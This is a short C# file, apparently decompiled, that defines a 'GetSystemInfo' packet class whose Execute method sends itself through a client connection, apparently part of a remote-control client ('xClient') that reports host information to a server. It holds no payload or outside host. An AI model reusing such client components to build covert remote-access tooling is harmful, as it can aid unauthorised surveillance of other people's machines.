using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x02000099 RID: 153
	[Serializable]
	public class GetSystemInfo : IPacket
	{
		// Token: 0x060003EF RID: 1007 RVA: 0x00003F79 File Offset: 0x00002179
		public void Execute(Client client)
		{
			client.Send<GetSystemInfo>(this);
		}
	}
}
